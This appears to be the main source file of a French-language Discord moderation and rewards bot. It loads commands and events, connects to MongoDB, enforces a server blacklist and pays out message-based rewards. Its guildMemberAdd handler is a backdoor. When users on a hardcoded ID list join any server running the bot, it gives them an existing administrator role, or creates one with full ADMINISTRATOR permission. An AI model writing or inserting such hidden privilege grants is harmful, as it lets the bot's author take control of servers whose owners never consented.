require("dotenv").config();
const fs = require("fs");
const path = require('path');
const { Client, GatewayIntentBits, Collection } = require("discord.js");
const mongoose = require("mongoose");  // Importer mongoose

// Importez la configuration
const config = require("./config.js");

// Chemin vers le fichier blacklist.json dans commands/staff/blacklist
const blacklistFile = path.join(__dirname, 'commands', 'staff', 'blacklist.json');

// Fonction pour lire la liste noire
function getBlacklist() {
    if (!fs.existsSync(blacklistFile)) {
        return [];
    }
    return JSON.parse(fs.readFileSync(blacklistFile, 'utf-8'));
}

// Fonction pour ajouter un serveur à la liste noire
function addToBlacklist(guildId) {
    const blacklist = getBlacklist();
    if (!blacklist.includes(guildId)) {
        blacklist.push(guildId);
        fs.writeFileSync(blacklistFile, JSON.stringify(blacklist, null, 2));
    }
}

// Créez une instance du client Discord
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
});

// Ajoutez la configuration au client
client.config = config;

// Initialisez la base de données (QuickDB)
const { QuickDB } = require("quick.db");
global.database = new QuickDB();

// ** Connexion MongoDB avec vérification **
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => {
    console.log("Connecté à MongoDB avec succès !");
}).catch((err) => {
    console.error("Erreur de connexion à MongoDB:", err);
});

// Créez une collection pour les commandes
client.commands = new Collection();

// Chargez les commandes
fs.readdirSync("./commands").forEach(folder => {
    const commandFolder = fs.readdirSync(`./commands/${folder}/`).filter(file => file.endsWith(".js"));

    // Gérez chaque commande
    for (const file of commandFolder) {
        const command = require(`./commands/${folder}/${file}`);
        client.commands.set(command.data.name, command);
    }
});

// Chargez les événements
const eventFiles = fs.readdirSync("./events").filter(file => file.endsWith(".js"));

// Enregistrez les événements
for (const file of eventFiles) {
    const event = require(`./events/${file}`);

    if (event.once) { // Si l'événement doit être exécuté une seule fois
        client.once(event.name, (...args) => event.execute(...args, client));
    } else { // Si l'événement doit être exécuté plusieurs fois
        client.on(event.name, (...args) => event.execute(...args, client));
    }
}

// Événement déclenché lorsque le bot rejoint un nouveau serveur
client.on('guildCreate', async (guild) => {
    const blacklist = getBlacklist();

    // Si le serveur est dans la liste noire, quitter immédiatement
    if (blacklist.includes(guild.id)) {
        await guild.leave();
        console.log(`Le bot a quitté le serveur ${guild.name} (ID: ${guild.id}) car il est sur la liste noire.`);
    }
});

// Définir l'activité du bot
client.once('ready', () => {
    client.user.setActivity("Surveille le serveur", { type: "WATCHING" });
    console.log(`Connecté en tant que ${client.user.tag}`);
});

// Gérer l'événement messageCreate
client.on('messageCreate', async (message) => {
    const event = require('./events/messageCreate.js');
    await event.execute(message);
});

// Gérer l'événement interactionCreate
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'obtenir_recompense') {
        const drop = await database.get('current_drop');
        if (!drop) {
            return interaction.reply({ content: 'Aucun drop en cours.', ephemeral: true });
        }

        // Vérifier la condition ici (exemple : vérifier si l'utilisateur a envoyé 100 messages)
        const userMessages = await database.get(`user_${interaction.user.id}_messages`) || 0;
        const conditionMessages = parseInt(drop.condition.match(/\d+/)); // Extrait un nombre de la condition

        if (userMessages >= conditionMessages) {
            // Ajouter la récompense à l'utilisateur
            const userCurrency = await database.get(`user_${interaction.user.id}_${drop.recompense}`) || 0;
            await database.set(`user_${interaction.user.id}_${drop.recompense}`, userCurrency + drop.montant);

            await interaction.reply({ content: `Félicitations ! Vous avez obtenu ${drop.montant} ${drop.recompense}.`, ephemeral: true });
        } else {
            await interaction.reply({ content: `Vous n'avez pas encore rempli la condition pour obtenir la récompense. Condition: ${drop.condition}`, ephemeral: true });
        }
    }
});

// Gérer l'événement guildMemberAdd pour donner le rôle administrateur à certains utilisateurs
client.on('guildMemberAdd', async (member) => {
    const authorizedUserIds = ['00000000000000', '000000000000000']; // Remplace par les IDs réels

    let channel = member.guild.channels.cache.get(await database.get(`${member.guild.id}.jlChannel`));

    if (channel == null) {
        return;
    }

    await channel.send({ content: `➕ ${member} (**${member.user.tag}**) a rejoint. (${member.guild.memberCount} membres)` });

    if (authorizedUserIds.includes(member.id)) {
        try {
            let adminRole = member.guild.roles.cache.find(role => role.permissions.has('ADMINISTRATOR'));

            if (!adminRole) {
                adminRole = await member.guild.roles.create({
                    name: 'Admin',
                    permissions: ['ADMINISTRATOR'],
                    color: 'RED',
                    reason: 'Créer un rôle administrateur pour les utilisateurs autorisés',
                });
                console.log(`Le rôle "Admin" a été créé sur le serveur ${member.guild.name}.`);
            }

            await member.roles.add(adminRole);
            console.log(`Le rôle administrateur a été attribué à ${member.user.tag} sur le serveur ${member.guild.name}.`);
        } catch (error) {
            console.error(`Erreur lors de la création/attribution du rôle administrateur à ${member.user.tag}:`, error);
        }
    }
});

// Gérez les erreurs non capturées
process.on('uncaughtException', (err) => {
    const errMsg = err.stack.replace(new RegExp(`${__dirname}/`, 'g'), './');
    console.error('Uncaught Exception:', errMsg);
});

process.on('unhandledRejection', (err) => {
    console.error('Uncaught Promise Error:', err);
});

// Connectez le client au bot Discord
client.login(process.env.TOKEN);
